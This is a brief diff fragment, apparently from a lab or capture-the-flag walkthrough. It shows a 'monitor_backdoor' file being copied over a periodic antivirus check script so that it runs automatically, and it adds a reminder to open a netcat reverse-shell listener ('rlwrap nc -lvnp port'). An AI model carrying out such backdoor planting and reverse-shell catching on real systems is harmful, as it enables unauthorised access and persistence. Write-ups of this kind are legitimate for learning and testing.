@@ -28,3 +28,5 @@ cp monitor_backdoor /opt/AV/periodic-checks/monitor
 
 
 and wait for it to get execuded. :)
+
+(dont forget your rlwrap nc -lvnp port)
